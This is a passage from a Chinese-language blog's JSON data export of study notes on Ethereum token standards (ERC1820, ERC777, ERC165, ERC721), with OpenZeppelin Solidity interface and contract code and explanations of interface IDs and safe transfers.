implementsERC165InterfaceNoCache( _contract, _interfaceId) ? _contract : address(0); erc165Cached[_contract][_interfaceId] = true; &#125; /// @notice 检查合约是否实现ERC165接口。 // 如果未缓存结果，则对合约地址进行查找。 如果结果未缓存或缓存已过期，则必须通过使用合约地址调用“updateERC165Cache”手动更新缓存。 /// @param _contract 要检查的合约地址。 /// @param _interfaceId 要检查ERC165接口。 /// @return True 如果合约实现了接口返回 true, 否则false. function implementsERC165Interface(address _contract, bytes4 _interfaceId) public view returns (bool) &#123; if (!erc165Cached[_contract][_interfaceId]) &#123; return implementsERC165InterfaceNoCache(_contract, _interfaceId); &#125; return interfaces[_contract][_interfaceId] == _contract; &#125; /// @notice 在不使用或更新缓存的情况下检查合约是否实现ERC165接口。 /// @param _contract 要检查的合约地址。 /// @param _interfaceId 要检查ERC165接口。 /// @return True 如果合约实现了接口返回 true, 否则false. function implementsERC165InterfaceNoCache(address _contract, bytes4 _interfaceId) public view returns (bool) &#123; uint256 success; uint256 result; (success, result) = noThrowCall(_contract, ERC165ID); if (success == 0 || result == 0) &#123; return false; &#125; (success, result) = noThrowCall(_contract, INVALID_ID); if (success == 0 || result != 0) &#123; return false; &#125; (success, result) = noThrowCall(_contract, _interfaceId); if (success == 1 &amp;&amp; result == 1) &#123; return true; &#125; return false; &#125; /// @notice 检查_interfaceHash 是否是ERC165接口（以28个零结尾）。 /// @param _interfaceHash 要检查接口 hash。 /// @return 如果 &#x27;_interfaceHash&#x27;是ERC165接口返回 True, 否则返回false function isERC165Interface(bytes32 _interfaceHash) internal pure returns (bool) &#123; return _interfaceHash &amp; 0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF == 0; &#125; /// @dev 调用合约接口，如果函数不存在也不抛出异常。 function noThrowCall(address _contract, bytes4 _interfaceId) internal view returns (uint256 success, uint256 result) &#123; bytes4 erc165ID = ERC165ID; assembly &#123; let x := mload(0x40) // Find empty storage location using &quot;free memory pointer&quot; mstore(x, erc165ID) // Place signature at beginning of empty storage mstore(add(x, 0x04), _interfaceId) // Place first argument directly next to signature success := staticcall( 30000, // 30k gas _contract, // To addr x, // Inputs are stored at location x 0x24, // Inputs are 36 (4 + 32) bytes long x, // Store output over input (saves space) 0x20 // Outputs are 32 bytes long ) result := mload(x) // Load the result &#125; &#125;&#125; 4. 原理阐述该标准为任何类型的地址（外部用户地址和合约）提供了一种实现接口的方法，并可能将接口的实现委托给代理合约。 委托给代理合约对于用户帐户地址是必要的，并且有助于避免重新部署如多签和DAO之类的现有合约。 注册表合约还可以充当ERC165缓存，以便在查找合约实现特定ERC165接口时节省Gas。 此实现特意保持缓存简单，因此没有自动缓存更新或失效机制。 任何人都可以通过调用updateERC165Cache函数轻松安全地更新任何接口和任何合约的缓存。 使用依赖于一次性部署地址的无密钥部署方法部署注册表，以确保没有人控制注册表，从而确保信任。 5.对合约是否实现某接口的判断方式判断合约是否实现某接口 6.实际应用的例子待续…… 参考文章","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"}],"tags":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1820","slug":"ERC1820","permalink":"https://biyouqiuqiu.com/tags/ERC1820/"}]},{"title":"ERC777的理解","slug":"Smart contracts/ERC/ERC777","date":"2023-07-07T14:47:10.000Z","updated":"2023-07-07T14:47:10.000Z","comments":true,"path":"2023/07/07/Smart contracts/ERC/ERC777/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/07/Smart%20contracts/ERC/ERC777/","excerpt":"","text":"1. ERC777介绍ERC777详细介绍 ERC777详细介绍—中文版 简介： ERC777 是以太坊上的一种代币标准，它是 ERC20 标准的升级版，旨在提供更加灵活和功能丰富的代币协议。 特点： 可以使用自定义的操作符（operators）进行代币的管理，包括代币的转移、销毁等操作。 可以向其他合约发送代币，支持更加复杂的场景，如代币的回收和再分配等。 支持代币的分组（token grouping），可以将代币按照不同的业务场景进行分类，方便管理和跟踪代币的使用情况。 支持代币的元数据（metadata），可以附加更多的信息到代币本身，如代币的名称、符号、发行人等。 可以通过事件（event）来监控代币的使用情况，方便用户和开发者了解代币的流通和使用情况。 2. ERC20和ERC7772.1 ERC20的缺陷虽然ERC20优势很大，也凭借这些优势实现了”垄断”，但它也有一些重大缺陷，只不过人们暂时找不到更好的协议来替代它。 当ERC20代币钱包用户向钱包用户发送token时，不会出现问题；但当钱包用户向智能合约发送token时，这些token会永远消失。如果用户不知道这一点，出现操作失误，将会造成token的丢失。 ERC20里有两种操作代币转账的方法，分别是针对账户和智能合约地址。我觉得这里可以理解成个人账户，和一个有智能合约代码的”对公账户”： 1.从你的账户把token发到别人的账户，用”Transfer”方法。 2.从你的账户把token发到一个智能合约地址，需要连续调用两个方法：”approve “和”transferFrom”。也就是两步： a. 授权（approve）：我允许这个智能合约账户来转我的token b. 转币（Transfer）：从我的账户转xxx token过去 这看起来没什么问题，但如果有人在操作的时候，不小心在一个”私对公”的转账功能里面，错用了”Transfer”呢？下面的错误就会发生： 举个例子，假设A把代币从钱包转到B智能合约，假设A转代币的时候错用了Transfer，结果就是A的余额减少了，而B那边其实收到了币，但由于使用了错误的转账方法，没有显示到账。 2.2 ERC777的优势在ERC20之后，提出过很多新的提案，来试图改进它，如ERC223、ERC677。但是它们要么会出现新的重大漏洞，要么只是略对ERC作了修改，并无实质上的创新。直到ERC777的出现，才看到了新时代来临的曙光，ERC777标准将允许代币持有者获得更多的控制权和更容易的交易。 降费提速：在ERC777标准中，一些高级交易——比如在去中心化交易合约中进行代币兑换——能够在一次交易中完成，而不是像过去那样分成两笔交易才能完成，这样的话，不仅代币兑换成本大幅降低(更便宜)，而且兑换速度也能变得更快。 向后兼容：ERC777兼容与ERC20兼容的所有应用程序，包括EtherDelta，IDEX，0x等。它具有ERC20所有的功能，同时还有附加功能 避免代币丢失：ERC777相对于ERC20的另一个优势是，防止以太币生态系统中不必要的加密货币损失。因为与ERC777兼容的地址能够拒绝某些特定类型的Token传入事件，例如来自黑名单地址的Token传入事件。 支持发送数据：ERC777可以像以太坊那样发送交易数据，调用智能合约的功能，使得可以使用超出以太坊本地可定制容量的Token。 2.3 ERC777的缺点ERC777的新功能确实带来一些小缺点: 由于它使用挂钩，转账交易费用略高 持有代币需更谨慎的审查，因为你必须信任你选择的运营商使用易代币创建你自己的ERC777代币! 3. ERC777 合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960interface ERC777Token &#123; function name() external view returns (string memory); function symbol() external view returns (string memory); function totalSupply() external view returns (uint256); function balanceOf(address holder) external view returns (uint256); function granularity() external view returns (uint256); function defaultOperators() external view returns (address[] memory); function isOperatorFor( address operator, address holder ) external view returns (bool); function authorizeOperator(address operator) external; function revokeOperator(address operator) external; function send(address to, uint256 amount, bytes calldata data) external; function operatorSend( address from, address to, uint256 amount, bytes calldata data, bytes calldata operatorData ) external; function burn(uint256 amount, bytes calldata data) external; function operatorBurn( address from, uint256 amount, bytes calldata data, bytes calldata operatorData ) external; event Sent( address indexed operator, address indexed from, address indexed to, uint256 amount, bytes data, bytes operatorData ); event Minted( address indexed operator, address indexed to, uint256 amount, bytes data, bytes operatorData ); event Burned( address indexed operator, address indexed from, uint256 amount, bytes data, bytes operatorData ); event AuthorizedOperator( address indexed operator, address indexed holder ); event RevokedOperator(address indexed operator, address indexed holder);&#125; 4.代码解读ERC777代码解读 参考文章","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"}],"tags":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC777","slug":"ERC777","permalink":"https://biyouqiuqiu.com/tags/ERC777/"}]},{"title":"ERC3156的理解","slug":"Smart contracts/ERC/ERC3156","date":"2023-07-07T04:47:10.000Z","updated":"2023-07-07T04:47:10.000Z","comments":true,"path":"2023/07/07/Smart contracts/ERC/ERC3156/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/07/Smart%20contracts/ERC/ERC3156/","excerpt":"","text":"官方文档","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"}],"tags":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC3156","slug":"ERC3156","permalink":"https://biyouqiuqiu.com/tags/ERC3156/"}]},{"title":"ERC165的理解","slug":"Smart contracts/ERC/ERC165","date":"2023-07-07T03:47:10.000Z","updated":"2023-07-07T03:47:10.000Z","comments":true,"path":"2023/07/07/Smart contracts/ERC/ERC165/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/07/Smart%20contracts/ERC/ERC165/","excerpt":"","text":"1. 说明这一提案创建了一个标准方法以发布和检测智能合约实现了哪些接口。 当我们需要和一个合约进行交互时，可能并不清楚它是否实现了某些合约（例如 IERC20 &#x2F;IERC721 等或者是指定某接口合约）从而具有某种功能。所以可以通过继承 ERC165（该合约必须实现ERC165）进行查询，从而可以避免很多交互的问题。 2. ERC165 标准ERC165 标准, 就是一个接口，里面只有一个方法——supportsInterface；用户可以通过调用此方法，输入相应查询的接口ID，查询该合约是否实现了对应的接口ID。 IERC165: 12345678910111213141516171819202122232425// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)pragma solidity ^0.8.19;/** * @dev Interface of the ERC165 standard, as defined in the * https://eips.ethereum.org/EIPS/eip-165[EIP]. * * Implementers can declare support of contract interfaces, which can then be * queried by others (&#123;ERC165Checker&#125;). * * For an implementation, see &#123;ERC165&#125;. */interface IERC165 &#123; /** * @dev Returns true if this contract implements the interface defined by * `interfaceId`. See the corresponding * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section] * to learn more about how these ids are created. * * This function call must use less than 30 000 gas. */ function supportsInterface(bytes4 interfaceId) external view returns (bool);&#125; ERC165: 123456789101112131415161718192021222324252627// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)pragma solidity ^0.8.19;import &#123;IERC165&#125; from &quot;./IERC165.sol&quot;;/** * @dev Implementation of the &#123;IERC165&#125; interface. * * Contracts that want to implement ERC165 should inherit from this contract and override &#123;supportsInterface&#125; to check * for the additional interface id that will be supported. For example: * * ```solidity * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) &#123; * return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId); * &#125; * ``` */abstract contract ERC165 is IERC165 &#123; /** * @dev See &#123;IERC165-supportsInterface&#125;. */ function supportsInterface(bytes4 interfaceId) public view virtual returns (bool) &#123; return interfaceId == type(IERC165).interfaceId; &#125;&#125; 3. 计算接口 ID接口是由以太坊ABI定义的一组函数选择器。函数选择器，就是函数签名哈希的前 4 字节。有三种方式生成： interfaceId == type(IERC165).interfaceId: type(name).interfaceId—name是所要求的接口名。 interfaceId == IERC165.supportsInterface.selector;: 对所要求的接口中的所有函数的selector进行异或。 (keccak256(&quot;supportsInterface(bytes4)&quot;)) 演示： 示例接口 Animal: 12345interface Animal&#123; function run() external pure; function eat(string memeory food) external pure;&#125; 实现合约AnimalImp： 1234567891011121314151617181920contract AnimalImp &#123; bytes4 result1; bytes4 result2; function calculateAnimalSelector1() public returns (bytes4) &#123; return result1 = bytes4(type(Animal).interfaceId); &#125; function calculateAnimalSelector2() public returns (bytes4) &#123; Animal a; return result2 = a.run.selector ^ a.eat.selector; &#125; function judgeAnimal() public view returns (bool) &#123; return result1 == result2; &#125;&#125; 4. 检测某合约是否实现了某接口12345678910111213contract ERC165 is IERC165, Animal &#123; function supportsInterface(bytes4 interfaceId) external pure returns (bool)&#123; return interfaceId == type(Animal).interfaceId || interfaceId == type(IERC165).interfaceId; &#125; function run() external pure&#123;&#125; function eat(string memory food) external&#123;&#125;&#125; 如果想知道ERC165是否实现了 IERC165接口，将可以往supportsInterface函数中传入的IERC165接口标识符,根据结果判断本合约是否实现了该接口，如本例中，就是表示 ERC165实现了IERC165和Animal接口。 传入 Animal的接口标志符:","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"}],"tags":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC165","slug":"ERC165","permalink":"https://biyouqiuqiu.com/tags/ERC165/"}]},{"title":"","slug":"Smart contracts/ERC/ERC3525","date":"2023-07-07T02:01:54.702Z","updated":"2023-07-07T02:01:54.702Z","comments":true,"path":"2023/07/07/Smart contracts/ERC/ERC3525/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/07/Smart%20contracts/ERC/ERC3525/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"","slug":"Smart contracts/ERC/ERC1155","date":"2023-07-07T01:59:51.864Z","updated":"2023-07-07T01:59:51.864Z","comments":true,"path":"2023/07/07/Smart contracts/ERC/ERC1155/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/07/Smart%20contracts/ERC/ERC1155/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"ERC721的理解","slug":"Smart contracts/ERC/ERC721","date":"2023-07-07T00:47:10.000Z","updated":"2023-07-07T00:47:10.000Z","comments":true,"path":"2023/07/07/Smart contracts/ERC/ERC721/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/07/Smart%20contracts/ERC/ERC721/","excerpt":"","text":"1. ERC721介绍概述： 和ERC20一样，ERC721同样是一个代币标准，此代币英文是Non-Fungible Tokens，简写为NFT，即非同质代币。 非同质代币(NFT)是一种具有唯一性识别的代币 ，ERC-20 Token可以无限细分为10^18份，而ERC721的Token最小的单位为1，无法再分割。 ERC721源码 从源码中可以看到， 有abstract contract ERC721 is Context, ERC165, IERC721, IERC721Metadata, IERC721Errors &#123;可以看出，ERC721继承了 Context, ERC165, IERC721, IERC721Metadata, IERC721Errors这一系列合约（包括了接口和合约和非接口合约）。 2. 合约知识拓展2.1 ERC165合约该合约之前已经学习过，就不再赘述了，链接： ERC165合约 2.2 IERC721合约IERC721是ERC721标准的接口合约，规定了ERC721要实现的基本函数。它利用tokenId来表示特定的非同质化代币，授权或转账都要明确tokenId；而ERC20只需要明确转账的数额即可。 IERC721.sol： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC721/IERC721.sol)pragma solidity ^0.8.19;import &#123;IERC165&#125; from &quot;../../utils/introspection/IERC165.sol&quot;;/** * @dev Required interface of an ERC721 compliant contract. */interface ERC721 &#123; /// @dev 当任何NFT的所有权更改时（不管哪种方式），就会触发此事件。 /// 包括在创建时（`from` == 0）和销毁时(`to` == 0), 合约创建时除外。 event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId); /// @dev 当更改或确认NFT的授权地址时触发。 /// 零地址表示没有授权的地址。 /// 发生 `Transfer` 事件时，同样表示该NFT的授权地址（如果有）被重置为“无”（零地址）。 event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId); /// @dev 所有者启用或禁用操作员时触发。（操作员可管理所有者所持有的NFTs） event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved); /// @notice 统计所持有的NFTs数量 /// @dev NFT 不能分配给零地址，查询零地址同样会异常 /// @param _owner ： 待查地址 /// @return 返回数量，也许是0 function balanceOf(address _owner) external view returns (uint256); /// @notice 返回所有者 /// @dev NFT 不能分配给零地址，查询零地址抛出异常 /// @param _tokenId NFT 的id /// @return 返回所有者地址 function ownerOf(uint256 _tokenId) external view returns (address); /// @notice 将NFT的所有权从一个地址转移到另一个地址 /// @dev 如果`msg.sender` 不是当前的所有者（或授权者）抛出异常 /// 如果 `_from` 不是所有者、`_to` 是零地址、`_tokenId` 不是有效id 均抛出异常。 /// 当转移完成时，函数检查 `_to` 是否是合约，如果是，调用 `_to`的 `onERC721Received` 并且检查返回值是否是 `0x150b7a02` (即：`bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`) 如果不是抛出异常。 /// @param _from ：当前的所有者 /// @param _to ：新的所有者 /// @param _tokenId ：要转移的token id. /// @param data : 附加额外的参数（没有指定格式），传递给接收者。 function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable; /// @notice 将NFT的所有权从一个地址转移到另一个地址，功能同上，不带data参数。 function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable; /// @notice 转移所有权 -- 调用者负责确认`_to`是否有能力接收NFTs，否则可能永久丢失。 /// @dev 如果`msg.sender` 不是当前的所有者（或授权者、操作员）抛出异常 /// 如果 `_from` 不是所有者、`_to` 是零地址、`_tokenId` 不是有效id 均抛出异常。 function transferFrom(address _from, address _to, uint256 _tokenId) external payable; /// @notice 更改或确认NFT的授权地址 /// @dev 零地址表示没有授权的地址。 /// 如果`msg.sender` 不是当前的所有者或操作员 /// @param _approved 新授权的控制者 /// @param _tokenId ： token id function approve(address _approved, uint256 _tokenId) external payable; /// @notice 启用或禁用第三方（操作员）管理 `msg.sender` 所有资产 /// @dev 触发 ApprovalForAll 事件，合约必须允许每个所有者可以有多个操作员。 /// @param _operator 要添加到授权操作员列表中的地址 /// @param _approved True 表示授权, false 表示撤销 function setApprovalForAll(address _operator, bool _approved) external; /// @notice 获取单个NFT的授权地址 /// @dev 如果 `_tokenId` 无效，抛出异常。 /// @param _tokenId ： token id /// @return 返回授权地址， 零地址表示没有。 function getApproved(uint256 _tokenId) external view returns (address); /// @notice 查询一个地址是否是另一个地址的授权操作员 /// @param _owner 所有者 /// @param _operator 代表所有者的授权操作员 function isApprovedForAll(address _owner, address _operator) external view returns (bool);&#125; 2.2.1 IERC721事件IERC721包含3个事件，其中Transfer和Approval事件在ERC20中也有。 Transfer事件：在转账时被释放，记录代币的发出地址from，接收地址to和tokenid。 Approval事件：在授权时释放，记录授权地址owner，被授权地址approved和tokenid。 ApprovalForAll事件：在批量授权时释放，记录批量授权的发出地址owner，被授权地址operator和授权与否的approved。 2.2.2 IERC721函数 balanceOf：返回某地址的NFT持有量balance。 ownerOf：返回某tokenId的主人owner。 transferFrom：普通转账，参数为转出地址from，接收地址to和tokenId。 safeTransferFrom：安全转账（如果接收方是合约地址，会要求实现ERC721Receiver接口）。参数为转出地址from，接收地址to和tokenId。 approve：授权另一个地址使用你的NFT。参数为被授权地址approve和tokenId。 getApproved：查询tokenId被批准给了哪个地址。 setApprovalForAll：将自己持有的该系列NFT批量授权给某个地址operator。 isApprovedForAll：查询某地址的NFT是否批量授权给了另一个operator地址。 safeTransferFrom：安全转账的重载函数，参数里面包含了data。 2.3 IERC721Metadata合约IERC721Metadata是ERC721的拓展接口，实现了3个查询metadata元数据的常用函数： name()：返回代币名称。 symbol()：返回代币代号。 tokenURI()：通过tokenId查询metadata的链接url，ERC721特有的函数。 IERC721Metadata.sol： 123456789101112131415161718192021222324252627// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)pragma solidity ^0.8.19;import &#123;IERC721&#125; from &quot;../IERC721.sol&quot;;/** * @title ERC-721 Non-Fungible Token Standard, optional metadata extension * @dev See https://eips.ethereum.org/EIPS/eip-721 */interface IERC721Metadata is IERC721 &#123; /** * @dev Returns the token collection name. */ function name() external view returns (string memory); /** * @dev Returns the token collection symbol. */ function symbol() external view returns (string memory); /** * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token. */ function tokenURI(uint256 tokenId) external view returns (string memory);&#125; 2.4 IERC721Errors合约IERC721Errors源码 2.5 ContexT合约ContexT.sol： 123456789101112131415161718192021222324// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)pragma solidity ^0.8.19;/** * @dev Provides information about the current execution context, including the * sender of the transaction and its data. While these are generally available * via msg.sender and msg.data, they should not be accessed in such a direct * manner, since when dealing with meta-transactions the account sending and * paying for execution may not be the actual sender (as far as an application * is concerned). * * This contract is only required for intermediate, library-like contracts. */abstract contract Context &#123; function _msgSender() internal view virtual returns (address) &#123; return msg.sender; &#125; function _msgData() internal view virtual returns (bytes calldata) &#123; return msg.data; &#125;&#125; 2.6 IERC721Receiver合约如果一个合约没有实现ERC721的相关函数，转入的NFT就进了黑洞，永远转不出来了。为了防止误转账，ERC721实现了safeTransferFrom()安全转账函数，目标合约必须实现了IERC721Receiver接口才能接收ERC721代币，不然会revert。IERC721Receiver接口只包含一个onERC721Received()函数。 IERC721Receiver.sol： 123456789101112131415161718192021222324252627// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)pragma solidity ^0.8.19;/** * @title ERC721 token receiver interface * @dev Interface for any contract that wants to support safeTransfers * from ERC721 asset contracts. */interface IERC721Receiver &#123; /** * @dev Whenever an &#123;IERC721&#125; `tokenId` token is transferred to this contract via &#123;IERC721-safeTransferFrom&#125; * by `operator` from `from`, this function is called. * * It must return its Solidity selector to confirm the token transfer. * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted. * * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`. */ function onERC721Received( address operator, address from, uint256 tokenId, bytes calldata data ) external returns (bytes4);&#125; ERC721利用_checkOnERC721Received来确保目标合约实现了onERC721Received()函数（返回onERC721Received的selector）。 ERC721对该接口的实现： 1234567891011121314151617181920212223function _checkOnERC721Received( address from, address to, uint256 tokenId, bytes memory data) private returns (bool) &#123; if (to.code.length &gt; 0) &#123; try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) &#123; return retval == IERC721Receiver.onERC721Received.selector; &#125; catch (bytes memory reason) &#123; if (reason.length == 0) &#123; revert ERC721InvalidReceiver(to); &#125; else &#123; /// @solidity memory-safe-assembly assembly &#123; revert(add(32, reason), mload(reason)) &#125; &#125; &#125; &#125; else &#123; return true; &#125;&#125; 3. ERC721主合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC721/ERC721.sol)pragma solidity ^0.8.19;import &#123;IERC721&#125; from &quot;./IERC721.sol&quot;;import &#123;IERC721Receiver&#125; from &quot;./IERC721Receiver.sol&quot;;import &#123;IERC721Metadata&#125; from &quot;./extensions/IERC721Metadata.sol&quot;;import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;import &#123;Strings&#125; from &quot;../../utils/Strings.sol&quot;;import &#123;IERC165, ERC165&#125; from &quot;../../utils/introspection/ERC165.sol&quot;;import &#123;IERC721Errors&#125; from &quot;../../interfaces/draft-IERC6093.sol&quot;;/** * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including * the Metadata extension, but not including the Enumerable extension, which is available separately as * &#123;ERC721Enumerable&#125;. */abstract contract ERC721 is Context, ERC165, IERC721, IERC721Metadata, IERC721Errors &#123; using Strings for uint256; // Token name string private _name; // Token symbol string private _symbol; // Mapping from token ID to owner address mapping(uint256 =&gt; address) private _owners; // Mapping owner address to token count mapping(address =&gt; uint256) private _balances; // Mapping from token ID to approved address mapping(uint256 =&gt; address) private _tokenApprovals; // Mapping from owner to operator approvals mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals; /** * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection. */ constructor(string memory name_, string memory symbol_) &#123; _name = name_; _symbol = symbol_; &#125; /** * @dev See &#123;IERC165-supportsInterface&#125;. */ function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) &#123; return interfaceId == type(IERC721).interfaceId || interfaceId == type(IERC721Metadata).interfaceId || super.supportsInterface(interfaceId); &#125; /** * @dev See &#123;IERC721-balanceOf&#125;. */ function balanceOf(address owner) public view virtual returns (uint256) &#123; if (owner == address(0)) &#123; revert ERC721InvalidOwner(address(0)); &#125; return _balances[owner]; &#125; /** * @dev See &#123;IERC721-ownerOf&#125;. */ function ownerOf(uint256 tokenId) public view virtual returns (address) &#123; address owner = _ownerOf(tokenId); if (owner == address(0)) &#123; revert ERC721NonexistentToken(tokenId); &#125; return owner; &#125; /** * @dev See &#123;IERC721Metadata-name&#125;. */ function name() public view virtual returns (string memory) &#123; return _name; &#125; /** * @dev See &#123;IERC721Metadata-symbol&#125;. */ function symbol() public view virtual returns (string memory) &#123; return _symbol; &#125; /** * @dev See &#123;IERC721Metadata-tokenURI&#125;. */ function tokenURI(uint256 tokenId) public view virtual returns (string memory) &#123; _requireMinted(tokenId); string memory baseURI = _baseURI(); return bytes(baseURI).length &gt; 0 ? string.concat(baseURI, tokenId.toString()) : &quot;&quot;; &#125; /** * @dev Base URI for computing &#123;tokenURI&#125;. If set, the resulting URI for each * token will be the concatenation of the `baseURI` and the `tokenId`. Empty * by default, can be overridden in child contracts. */ function _baseURI() internal view virtual returns (string memory) &#123; return &quot;&quot;; &#125; /** * @dev See &#123;IERC721-approve&#125;. */ function approve(address to, uint256 tokenId) public virtual &#123; address owner = ownerOf(tokenId); if (to == owner) &#123; revert ERC721InvalidOperator(owner); &#125; if (_msgSender() != owner &amp;&amp; !isApprovedForAll(owner, _msgSender())) &#123; revert ERC721InvalidApprover(_msgSender()); &#125; _approve(to, tokenId); &#125; /** * @dev See &#123;IERC721-getApproved&#125;. */ function getApproved(uint256 tokenId) public view virtual returns (address) &#123; _requireMinted(tokenId); return _tokenApprovals[tokenId]; &#125; /** * @dev See &#123;IERC721-setApprovalForAll&#125;. */ function setApprovalForAll(address operator, bool approved) public virtual &#123; _setApprovalForAll(_msgSender(), operator, approved); &#125; /** * @dev See &#123;IERC721-isApprovedForAll&#125;. */ function isApprovedForAll(address owner, address operator) public view virtual returns (bool) &#123; return _operatorApprovals[owner][operator]; &#125; /** * @dev See &#123;IERC721-transferFrom&#125;. */ function transferFrom(address from, address to, uint256 tokenId) public virtual &#123; if (!_isApprovedOrOwner(_msgSender(), tokenId)) &#123; revert ERC721InsufficientApproval(_msgSender(), tokenId); &#125; _transfer(from, to, tokenId); &#125; /** * @dev See &#123;IERC721-safeTransferFrom&#125;. */ function safeTransferFrom(address from, address to, uint256 tokenId) public virtual &#123; safeTransferFrom(from, to, tokenId, &quot;&quot;); &#125; /** * @dev See &#123;IERC721-safeTransferFrom&#125;. */ function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) public virtual &#123; if (!_isApprovedOrOwner(_msgSender(), tokenId)) &#123; revert ERC721InsufficientApproval(_msgSender(), tokenId); &#125; _safeTransfer(from, to, tokenId, data); &#125; /** * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients * are aware of the ERC721 protocol to prevent tokens from being forever locked. * * `data` is additional data, it has no specified format and it is sent in call to `to`. * * This internal function is equivalent to &#123;safeTransferFrom&#125;, and can be used to e.g. * implement alternative mechanisms to perform token transfer, such as signature-based. * * Requirements: * * - `from` cannot be the zero address. * - `to` cannot be the zero address. * - `tokenId` token must exist and be owned by `from`. * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer. * * Emits a &#123;Transfer&#125; event. */ function _safeTransfer(address from, address to, uint256 tokenId, bytes memory data) internal virtual &#123; _transfer(from, to, tokenId); if (!_checkOnERC721Received(from, to, tokenId, data)) &#123; revert ERC721InvalidReceiver(to); &#125; &#125; /** * @dev Returns the owner of the `tokenId`. Does NOT revert if token doesn&#x27;t exist */ function _ownerOf(uint256 tokenId) internal view virtual returns (address) &#123; return _owners[tokenId]; &#125; /** * @dev Returns whether `tokenId` exists. * * Tokens can be managed by their owner or approved accounts via &#123;approve&#125; or &#123;setApprovalForAll&#125;. * * Tokens start existing when they are minted (`_mint`), * and stop existing when they are burned (`_burn`). */ function _exists(uint256 tokenId) internal view virtual returns (bool) &#123; return 